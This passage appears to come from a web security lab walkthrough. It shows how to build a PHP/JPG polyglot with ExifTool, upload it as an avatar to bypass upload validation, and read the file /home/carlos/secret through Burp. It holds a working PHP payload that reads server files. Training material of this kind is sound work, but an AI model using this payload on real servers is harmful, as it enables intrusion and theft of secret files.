- Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
    
    `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" kitty.jpg -o polyglot.php`
    
    This adds your PHP payload to the image's `Comment` field, then saves the image with a `.php` extension.
    
- In the browser, upload the polyglot image as your avatar, then go back to your account page.
- In Burp's proxy history, find the `GET /files/avatars/polyglot.php` request. Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should see Carlos's secret, for example: